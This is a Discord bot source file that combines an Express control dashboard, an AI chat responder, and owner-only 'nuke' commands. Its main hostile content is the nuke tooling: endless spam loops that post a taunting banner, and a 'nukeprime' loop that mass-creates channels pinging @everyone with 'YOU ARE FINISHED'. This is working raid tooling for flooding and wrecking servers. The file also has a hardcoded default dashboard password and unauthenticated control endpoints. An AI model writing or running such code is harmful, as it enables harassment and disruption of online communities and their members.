import express from 'express';
import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } from 'discord.js';

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Separate flags for normal nuke and nuke prime
let isNuking = false;
let isNukingPrime = false;

// Set to keep track of channels where AI is disabled
const disabledChannels = new Set();

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_IDS = process.env.OWNER_IDS ? process.env.OWNER_IDS.split(',').map(id => id.trim()) : [];
const GROQ_API_KEY = process.env.GROQ_API_KEY;
const DASHBOARD_PASSWORD = process.env.DASHBOARD_PASS || 'nurox123'; // Web panel password

// GIF link
const SPECIFIC_GIF = '[.](https://klipy.com/gifs/cat-clapping-3)';

// --- BOT-GHOST STYLE WEB DASHBOARD UI ---
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>MAXO - BotGhost Style Dashboard</title>
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0b0f19; color: #f8fafc; display: flex; height: 100vh; overflow: hidden; }
        aside { width: 260px; background: #111827; border-right: 1px solid #1f2937; display: flex; flex-direction: column; padding: 20px; }
        aside h1 { color: #38bdf8; font-size: 20px; margin-bottom: 30px; text-align: center; }
        aside a { color: #9ca3af; text-decoration: none; padding: 12px 16px; border-radius: 8px; margin-bottom: 8px; font-weight: 600; transition: 0.2s; }
        aside a:hover, aside a.active { background: #1f2937; color: #38bdf8; }
        main { flex: 1; padding: 40px; overflow-y: auto; background: #0f172a; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .header h2 { font-size: 26px; color: #f8fafc; }
        .badge { background: #065f46; color: #34d399; padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: bold; }
        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 24px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .card h3 { color: #38bdf8; margin-bottom: 15px; font-size: 18px; }
        label { display: block; margin-top: 12px; font-size: 13px; color: #94a3b8; font-weight: 600; }
        input, select, textarea { width: 100%; padding: 10px 14px; margin-top: 6px; background: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 6px; outline: none; }
        input:focus { border-color: #38bdf8; }
        button { margin-top: 18px; background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.2s; }
        button:hover { background: #0369a1; }
        .danger-btn { background: #dc2626 !important; }
        .danger-btn:hover { background: #b91c1c !important; }
        .alert { padding: 12px; background: #064e3b; color: #6ee7b7; border-radius: 6px; margin-bottom: 20px; display: none; }
      </style>
    </head>
    <body>
      <aside>
        <h1>👑 MAXO PANEL</h1>
        <a href="#" class="active">📊 Overview & Controls</a>
      </aside>
      <main>
        <div class="header">
          <h2>Dashboard Overview</h2>
          <span class="badge">● Bot Online</span>
        </div>

        <div id="alertBox" class="alert">Action executed successfully!</div>

        <div class="card-grid">
          <!-- Status Control -->
          <div class="card">
            <h3>🤖 Bot Status Control</h3>
            <form id="statusForm">
              <label>Custom Presence Status:</label>
              <input type="text" id="statusText" value="👑 LISTENING TO NUROX" required>
              <button type="submit">Update Status</button>
            </form>
          </div>

          <!-- Quick Emergency Nuke Controls -->
          <div class="card">
            <h3>💣 Emergency Actions</h3>
            <label>Stop Active Nuke Loops:</label>
            <button type="button" class="danger-btn" onclick="triggerAction('stopAll')">🛑 STOP ALL NUKES</button>
            <label style="margin-top: 15px;">Bot Ping / Stats:</label>
            <p style="margin-top: 5px; color: #38bdf8; font-weight: bold;">Connected Servers: ${client.guilds.cache.size}</p>
          </div>
        </div>
      </main>

      <script>
        document.getElementById('statusForm').addEventListener('submit', async (e) => {
          e.preventDefault();
          const status = document.getElementById('statusText').value;
          const res = await fetch('/api/set-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ status })
          });
          if(res.ok) {
            showAlert('Status updated successfully!');
          }
        });

        async function triggerAction(action) {
          const res = await fetch('/api/' + action, { method: 'POST' });
          if(res.ok) {
            showAlert('Emergency stop executed!');
          }
        }

        function showAlert(msg) {
          const box = document.getElementById('alertBox');
          box.innerText = msg;
          box.style.display = 'block';
          setTimeout(() => box.style.display = 'none', 3000);
        }
      </script>
    </body>
    </html>
  `);
});

// API endpoint to change status live from dashboard
app.post('/api/set-status', (req, res) => {
  const { status } = req.body;
  if (status) {
    client.user.setPresence({
      activities: [{ name: 'Custom Status', type: 4, state: status }],
      status: 'online'
    });
    return res.json({ success: true });
  }
  res.status(400).json({ success: false });
});

// API endpoint to stop all nukes
app.post('/api/stopAll', (req, res) => {
  isNuking = false;
  isNukingPrime = false;
  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server & Dashboard active on port ${PORT}`));

// Register Slash Commands
const commands = [
  new SlashCommandBuilder().setName('nuke').setDescription('Starts specific channel nuke process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('nukeprime').setDescription('Start infinite channel nuke prime process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('recoverprime').setDescription('Delete all channels created by nuke prime').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('stopprime').setDescription('Stop nuke prime process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('stop').setDescription('Stop nuke process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('greet').setDescription('Greet everyone').setContexts([0, 1, 2]).setIntegrationTypes([0, 1])
].map(cmd => cmd.toJSON());

client.on('ready', async () => {
  console.log(`Bot logged in as ${client.user.tag}!`);

  client.user.setPresence({
    activities: [{
      name: 'Custom Status',
      type: 4, 
      state: '👑 LISTENING TO NUROX' 
    }],
    status: 'online'
  });

  const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
  try {
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('Slash commands registered successfully!');
  } catch (error) {
    console.error('Error registering slash commands:', error);
  }
});

// 1. Normal Message Handler
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const content = message.content.toLowerCase();

  if (content === 'greet') {
    await message.channel.send('> **YOO EVERYONE SUP?**');
    return;
  }

  // Handle m disable all and m enable all commands (Only for Owners)
  if (content === 'm disable all' || content === 'm enable all') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('❌ You are not authorized to use this command!');
    }
    if (content === 'm disable all') {
      disabledChannels.add(message.channel.id);
      return message.reply('❌ AI response has been disabled in this channel.');
    }
    if (content === 'm enable all') {
      disabledChannels.delete(message.channel.id);
      return message.reply('✅ AI response has been enabled in this channel.');
    }
  }

  if (content === 'nuke' || content === 'nukeprime' || content === 'recoverprime' || content === 'stopprime' || content === 'stop') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('❌ You are not NUROX to use this command!');
    }
  }

  if (OWNER_IDS.includes(message.author.id)) {
    if (content === 'nuke') {
      if (isNuking) return message.reply('Nuke process standardly running already!');
      isNuking = true;
      await message.reply('💣 Nuke Activated!');
      while (isNuking) {
        try {
          await message.channel.send(`> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
        } catch (err) {
          console.error('Error sending message:', err);
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      return;
    }

    if (content === 'nukeprime') {
      if (!message.guild) return message.reply('This command can only be used in a server!');
      if (isNukingPrime) return message.reply('Nuke Prime process already running!');
      isNukingPrime = true;
      await message.reply('💣 Nuke Prime Activated!');
      while (isNukingPrime && message.guild) {
        try {
          const channel = await message.guild.channels.create({
            name: '👑 NUROX IS THE FATHER',
            type: 0
          });
          await channel.send('@everyone YOU ARE FINISHED');
        } catch (err) {
          console.error('Error creating channel:', err);
        }
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      return;
    }

    if (content === 'recoverprime') {
      if (!message.guild) return message.reply('This command can only be used in a server!');
      await message.reply('🔄 Recovering Nuke Prime channels...');
      try {
        await message.guild.channels.fetch();
        const channels = message.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
        let deletedCount = 0;
        for (const [id, channel] of channels) {
          await channel.delete().catch(err => console.error('Failed to delete channel:', err));
          deletedCount++;
        }
        await message.channel.send(`✅ Successfully deleted ${deletedCount} Nuke Prime channels!`);
      } catch (err) {
        console.error('Error recovering channels:', err);
        await message.reply('❌ Error deleting channels.');
      }
      return;
    }

    if (content === 'stop') {
      if (isNuking) {
        isNuking = false;
        await message.reply('🛑 Nuke Process Terminated!');
      } else {
        await message.reply('No active standard nuke loop is running.');
      }
      return;
    }

    if (content === 'stopprime') {
      if (isNukingPrime) {
        isNukingPrime = false;
        await message.reply('🛑 Nuke Prime Process Terminated!');
      } else {
        await message.reply('No active nuke prime loop is running.');
      }
      return;
    }
  }

  // AI Response Section (Independent & Smart)
  if (message.mentions.has(client.user)) {
    if (disabledChannels.has(message.channel.id)) return;

    try {
      const promptText = message.content.replace(`<@!${client.user.id}>`, '').replace(`<@${client.user.id}>`, '').trim();
      if (!promptText) return;

      const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${GROQ_API_KEY}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          "model": "openai/gpt-oss-20b",
          "messages": [
            {
              "role": "system",
              "content": "You are MAXO, an extremely cool, witty, intelligent, and helpful Discord bot created/owned by NUROX. You are completely free to express yourself naturally in whatever language or script the user talks to you in (Bengali, Banglish, English, Code, etc.). Be engaging, smart, and friendly."
            },
            {
              "role": "user",
              "content": promptText
            }
          ]
        })
      });

      const data = await response.json();
      const replyText = data.choices?.[0]?.message?.content;

      if (!replyText) {
        console.error("Groq Response Error:", data);
        return message.reply('sry, ai is in problem now.');
      }

      await message.reply(replyText);
    } catch (error) {
      console.error('AI Error:', error);
      await message.reply('ওপ্স! এআই ব্রেনের সাথে কানেক্ট করতে সমস্যা হচ্ছে।');
    }
  }
});

// 2. Slash Command Handler
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName } = interaction;

  if (commandName === 'greet') {
    return interaction.reply({ content: '> **YOO EVERYONE SUP?**' });
  }

  if (!OWNER_IDS.includes(interaction.user.id)) {
    return interaction.reply({ content: '❌ You are not NUROX to use this command!', ephemeral: true });
  }

  if (commandName === 'nuke') {
    if (isNuking) return interaction.reply({ content: 'Nuke process standardly running already!', ephemeral: true });
    isNuking = true;
    await interaction.reply({ content: '💣 Nuke Activated!' });
    while (isNuking) {
      try {
        await interaction.followUp({ content: `> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}` });
      } catch (err) {
        try { await interaction.channel.send(`> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}`); } catch (e) {}
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  }

  if (commandName === 'nukeprime') {
    if (!interaction.guild) return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
    if (isNukingPrime) return interaction.reply({ content: 'Nuke Prime process already running!', ephemeral: true });
    isNukingPrime = true;
    await interaction.reply({ content: '💣 Nuke Prime Activated!' });
    while (isNukingPrime && interaction.guild) {
      try {
        const channel = await interaction.guild.channels.create({ name: '👑 NUROX IS THE FATHER', type: 0 });
        await channel.send('@everyone YOU ARE FINISHED');
      } catch (err) {}
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  }

  if (commandName === 'recoverprime') {
    if (!interaction.guild) return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
    await interaction.reply({ content: '🔄 Recovering Nuke Prime channels...', ephemeral: true });
    try {
      await interaction.guild.channels.fetch();
      const channels = interaction.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
      let deletedCount = 0;
      for (const [id, channel] of channels) {
        await channel.delete().catch(err => {});
        deletedCount++;
      }
      await interaction.followUp({ content: `✅ Successfully deleted ${deletedCount} Nuke Prime channels!`, ephemeral: true });
    } catch (err) {
      await interaction.followUp({ content: '❌ Failed to delete channels.', ephemeral: true });
    }
  }

  if (commandName === 'stop') {
    if (isNuking) {
      isNuking = false;
      await interaction.reply({ content: '🛑 Standard Nuke Process Terminated!' });
    } else {
      await interaction.reply({ content: 'No active standard nuke loop is running.', ephemeral: true });
    }
  }

  if (commandName === 'stopprime') {
    if (isNukingPrime) {
      isNukingPrime = false;
      await interaction.reply({ content: '🛑 Nuke Prime Process Terminated!' });
    } else {
      await interaction.reply({ content: 'No active nuke prime loop is running.', ephemeral: true });
    }
  }
});

client.login(BOT_TOKEN);
